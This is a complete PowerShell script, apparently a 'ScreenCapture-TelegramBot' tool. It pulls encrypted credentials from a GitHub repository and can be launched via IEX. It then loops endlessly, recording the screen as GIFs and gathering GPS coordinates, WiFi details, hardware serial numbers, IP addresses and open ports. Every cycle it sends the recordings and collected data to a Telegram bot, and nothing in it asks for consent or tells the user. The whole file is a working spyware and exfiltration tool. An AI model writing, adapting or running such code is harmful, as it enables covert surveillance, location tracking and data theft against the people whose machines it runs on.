# --- Fallback for $PSScriptRoot when running via IEX or from a remote source ---
if (-not $PSScriptRoot -or $PSScriptRoot -eq '') {
    $PSScriptRoot = (Get-Location).Path
}

# ===============================
# Attempt to Download cred.dat from GitHub if Not Present Locally
# ===============================
$CredFile = Join-Path $PSScriptRoot "src\cred.dat"
if (-not (Test-Path $CredFile)) {
    Write-Host "cred.dat not found locally. Attempting to download from GitHub..."
    try {
        $remoteCredUrl = "https://raw.githubusercontent.com/Aman-SecurityKnock/ScreenCapture-TelegramBot/refs/heads/main/src/cred.dat"
        $credFolder = Split-Path $CredFile
        if (-not (Test-Path $credFolder)) {
            New-Item -ItemType Directory -Path $credFolder | Out-Null
        }
        Invoke-WebRequest -Uri $remoteCredUrl -OutFile $CredFile -UseBasicParsing
        Write-Host "Downloaded cred.dat successfully."
    }
    catch {
        Write-Host "Failed to download cred.dat. You will be prompted for credentials."
    }
}

# ===============================
# Function: Get Passphrase from Environment or Prompt
# ===============================
function Get-Passphrase {
    if ($env:MY_CRED_PASSPHRASE) {
        return $env:MY_CRED_PASSPHRASE
    }
    else {
        return [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                    [Runtime.InteropServices.Marshal]::SecureStringToBSTR(
                        (Read-Host "Enter passphrase to decrypt credentials" -AsSecureString)
                    )
                )
    }
}

# ===============================
# AES Encryption / Decryption Functions (Cross-Machine)
# ===============================
function Encrypt-String {
    param (
        [Parameter(Mandatory)]
        [string]$plainText,
        [Parameter(Mandatory)]
        [string]$password
    )
    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Generate a random salt (16 bytes)
    $salt = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)

    # Derive Key and IV using PBKDF2 (Rfc2898DeriveBytes)
    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000)
    $aes.Key = $deriveBytes.GetBytes($aes.KeySize / 8)
    $aes.IV  = $deriveBytes.GetBytes($aes.BlockSize / 8)

    # Encrypt plain text
    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

    # Combine salt + encrypted data and encode to base64
    $result = $salt + $encryptedBytes
    return [Convert]::ToBase64String($result)
}

function Decrypt-String {
    param (
        [Parameter(Mandatory)]
        [string]$cipherText,
        [Parameter(Mandatory)]
        [string]$password
    )
    $allBytes = [Convert]::FromBase64String($cipherText)
    # Extract the first 16 bytes as salt
    $salt = $allBytes[0..15]
    # The remaining bytes are the cipher data
    $cipherBytes = $allBytes[16..($allBytes.Length - 1)]

    $aes = [System.Security.Cryptography.AesManaged]::new()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000)
    $aes.Key = $deriveBytes.GetBytes($aes.KeySize / 8)
    $aes.IV  = $deriveBytes.GetBytes($aes.BlockSize / 8)

    $decryptor = $aes.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# ===============================
# Credential Handling (Using AES Encryption)
# ===============================
function Get-Credentials {
    param (
        [string]$CredFile
    )
    if (-not (Test-Path $CredFile)) {
        Write-Host "Credential file not found. Please enter your Telegram credentials."
        $PlainBotToken = Read-Host "Enter your Telegram Bot Token"
        $PlainChatID   = Read-Host "Enter your Telegram Chat ID"
        $Passphrase = Get-Passphrase
        
        $EncryptedBotToken = Encrypt-String -plainText $PlainBotToken -password $Passphrase
        $EncryptedChatID   = Encrypt-String -plainText $PlainChatID   -password $Passphrase
        
        $CredObject = @{
            BotToken = $EncryptedBotToken
            ChatID   = $EncryptedChatID
        }
        $credFolder = Split-Path $CredFile
        if (-not (Test-Path $credFolder)) {
            New-Item -ItemType Directory -Path $credFolder | Out-Null
        }
        $CredObject | ConvertTo-Json | Out-File $CredFile -Encoding UTF8
        Write-Host "Credentials encrypted and saved to $CredFile."
        return $CredObject
    }
    else {
        $CredObject = Get-Content $CredFile -Raw | ConvertFrom-Json
        $Passphrase = Get-Passphrase
        $DecryptedBotToken = Decrypt-String -cipherText $CredObject.BotToken -password $Passphrase
        $DecryptedChatID   = Decrypt-String -cipherText $CredObject.ChatID   -password $Passphrase
        return @{ BotToken = $DecryptedBotToken; ChatID = $DecryptedChatID }
    }
}

# Retrieve credentials (if cred.dat is available, this will load without prompting for token/chat id)
$Creds = Get-Credentials -CredFile $CredFile
$BotToken = $Creds.BotToken
$ChatID   = $Creds.ChatID

# ===============================
# Function: Capture a Single Screenshot Frame as a BitmapSource
# ===============================
function Capture-Frame {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName PresentationCore

    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    $hBitmap = $bmp.GetHbitmap()
    $bitmapSource = [System.Windows.Interop.Imaging]::CreateBitmapSourceFromHBitmap(
        $hBitmap,
        [IntPtr]::Zero,
        [System.Windows.Int32Rect]::new(0,0,$bmp.Width,$bmp.Height),
        [System.Windows.Media.Imaging.BitmapSizeOptions]::FromEmptyOptions()
    )
    Add-Type -MemberDefinition @"
    [DllImport("gdi32.dll")]
    public static extern bool DeleteObject(IntPtr hObject);
"@ -Name GDI32 -Namespace Win32
    [Win32.GDI32]::DeleteObject($hBitmap) | Out-Null
    $bmp.Dispose()
    return $bitmapSource
}

# ===============================
# Function: Capture an Animated GIF of the Screen over a Given Duration
# ===============================
function Capture-AnimatedGIF {
    param(
        [int]$durationSeconds = 10,
        [int]$framesPerSecond = 3
    )
    Add-Type -AssemblyName PresentationCore

    $encoder = New-Object System.Windows.Media.Imaging.GifBitmapEncoder
    $totalFrames = [Math]::Ceiling($durationSeconds * $framesPerSecond)
    $frameInterval = 1 / $framesPerSecond

    for ($i = 0; $i -lt $totalFrames; $i++) {
        $frame = Capture-Frame
        $encoder.Frames.Add([System.Windows.Media.Imaging.BitmapFrame]::Create($frame))
        Start-Sleep -Seconds $frameInterval
    }
    $gifPath = Join-Path $PSScriptRoot "screenrecord.gif"
    $fs = [System.IO.File]::Open($gifPath, [System.IO.FileMode]::Create)
    $encoder.Save($fs)
    $fs.Close()
    return $gifPath
}

# ===============================
# Function: Send an Animation (GIF) to the Telegram Bot
# ===============================
function Send-TelegramAnimation {
    param (
        [string]$GifPath
    )
    
    $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
    
    # Create a boundary for multipart/form-data
    $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
    $LF = "`r`n"
    
    $ms = New-Object System.IO.MemoryStream
    
    # Field: chat_id
    $chatIdHeader = "--$Boundary$LF" +
                    'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                    $ChatID + $LF
    $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
    $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
    
    # Field: animation file
    $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
    $fileHeader = "--$Boundary$LF" +
                  'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
                  "Content-Type: image/gif$LF$LF"
    $fileHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($fileHeader)
    $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    
    # Ending boundary
    $ending = "$LF--$Boundary--$LF"
    $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
    $ms.Write($endingBytes, 0, $endingBytes.Length)
    
    $ms.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $ContentBytes = $ms.ToArray()
    
    $WebRequest = [System.Net.HttpWebRequest]::Create($Uri)
    $WebRequest.Method = "POST"
    $WebRequest.ContentType = "multipart/form-data; boundary=$Boundary"
    $WebRequest.ContentLength = $ContentBytes.Length
    
    $Stream = $WebRequest.GetRequestStream()
    $Stream.Write($ContentBytes, 0, $ContentBytes.Length)
    $Stream.Close()
    
    $Response = $WebRequest.GetResponse()
    $ResponseStream = $Response.GetResponseStream()
    $Reader = New-Object System.IO.StreamReader($ResponseStream)
    $null = $Reader.ReadToEnd() | Out-Null
    $Reader.Close()
    $ResponseStream.Close()
    $Response.Close()
}

# ===============================
# Function: Send a Text Message to the Telegram Bot
# ===============================
function Send-TelegramMessage {
    param (
        [string]$Message
    )
    $Uri = "https://api.telegram.org/bot$BotToken/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }
    try {
        Invoke-RestMethod -Uri $Uri -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json) | Out-Null
    }
    catch {
        Write-Error "Failed to send message: $_"
    }
}

# ===============================
# Function: Get Native GPS Location using Windows Location Services
# ===============================
Add-Type -AssemblyName System.Device
function Get-WindowsGeolocation {
    $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $watcher.Start()
    
    # Wait for location acquisition (max 30 seconds)
    $timeout = 30
    while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
        Start-Sleep -Milliseconds 100
        $timeout--
    }

    if ($watcher.Position.Location.IsUnknown) {
        return $null
    }

    return @{
        Latitude = $watcher.Position.Location.Latitude
        Longitude = $watcher.Position.Location.Longitude
        Accuracy = $watcher.Position.Location.HorizontalAccuracy
    }
}

# ===============================
# Function: Get Complete System & Network Information
# ===============================
function Get-CompleteSystemInfo {
    $computerName = $env:COMPUTERNAME
    $osInstance = Get-CimInstance Win32_OperatingSystem
    $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
    $dateTime = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

    $basicInfo = "=== Basic System Information ===`n" +
                 "Computer Name: $computerName`n" +
                 "OS: $osInfo`n" +
                 "Date/Time: $dateTime`n"

    try {
        $wifiOutput = netsh wlan show interfaces | Out-String
        $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        $signal = ($wifiOutput | Select-String "^\s*Signal\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
        if (-not $ssid) { $ssid = "N/A" }
        if (-not $signal) { $signal = "N/A" }
    }
    catch {
        $ssid = "N/A"
        $signal = "N/A"
    }
    $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"

    $geo = Get-WindowsGeolocation
    if ($geo) {
        $latitude = $geo.Latitude
        $longitude = $geo.Longitude
        $accuracy = $geo.Accuracy
        $locationInfo = "Latitude: $latitude, Longitude: $longitude (Accuracy: $accuracy m)"
    }
    else {
        $locationInfo = "Location unavailable. Ensure Location Services are enabled."
    }
    $locationSection = "GPS Location: $locationInfo`n"

    $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
    $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
    $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
    $enclosure = Get-CimInstance -ClassName Win32_SystemEnclosure | Select-Object SerialNumber, ChassisTypes

    $systemInfoSection = "=== Detailed System Information ===`n" +
                         "Manufacturer: $($cs.Manufacturer)`n" +
                         "Model (Friendly Name): $($cs.Model)`n" +
                         "MTM (Machine Type Model): $($csp.Name)`n"
    if ($csp.Version) {
        $systemInfoSection += "Product Version: $($csp.Version)`n"
    }
    $biosSection = "`nBIOS Information:`n" +
                   "  Serial Number: $($bios.SerialNumber)`n" +
                   "  BIOS Version: $($bios.Version)`n" +
                   "  Release Date: $($bios.ReleaseDate)`n"
    $enclosureSection = "`nSystem Enclosure:`n" +
                        "  Serial Number: $($enclosure.SerialNumber)`n" +
                        "  Chassis Type: $($enclosure.ChassisTypes)`n"
    $productSection = "`nProduct Information:`n" +
                      "  Identifying Number (SN): $($csp.IdentifyingNumber)`n" +
                      "  UUID: $($csp.UUID)`n" +
                      "  Vendor: $($csp.Vendor)`n"

    $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                   Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                   Select-Object InterfaceAlias, IPAddress, PrefixLength
    $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
    foreach ($ip in $ipAddresses) {
        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress) / $($ip.PrefixLength)`n"
    }

    try {
        $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
        if ($wifiAdapter) {
            $wifiDetails = netsh wlan show interfaces | Out-String
            $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
            $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
            $wifiSection = "`nWiFi Information:`n" +
                           "ESSID: $essid`n" +
                           "BSSID: $bssid`n"
        }
        else {
            $wifiSection = "`nNo active WiFi interface found`n"
        }
    }
    catch {
        $wifiSection = "`nError retrieving WiFi information`n"
    }

    try {
        $listeningPorts = Get-NetTCPConnection -State Listen | 
                          Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
                          Select-Object LocalAddress, LocalPort, 
                              @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}},
                              OwningProcess
        $portsSection = "`nOpen Ports (Listening):`n"
        foreach ($port in $listeningPorts) {
            $portsSection += "IP: $($port.LocalAddress) - Port: $($port.LocalPort) - Process: $($port.Process)`n"
        }
    }
    catch {
        $portsSection = "`nError retrieving open ports information`n"
    }

    $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
    $adaptersSection = "`nNetwork Adapters:`n"
    foreach ($adapter in $adapters) {
        $adaptersSection += "Name: $($adapter.Name), Description: $($adapter.InterfaceDescription), LinkSpeed: $($adapter.LinkSpeed)`n"
    }

    $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
    $gatewaySection = "`nDefault Gateway:`n"
    foreach ($route in $defaultGateway) {
        $gatewaySection += "NextHop: $($route.NextHop), Interface: $($route.InterfaceAlias)`n"
    }

    $completeInfo = $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
    return $completeInfo
}

# ===============================
# Main Loop: Capture & Send a 10-Second Screen Recording and System Info
# ===============================
while ($true) {
    $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
    Send-TelegramAnimation -GifPath $gifPath
    $systemInfo = Get-CompleteSystemInfo
    Send-TelegramMessage -Message $systemInfo
    Start-Sleep -Seconds 2
}
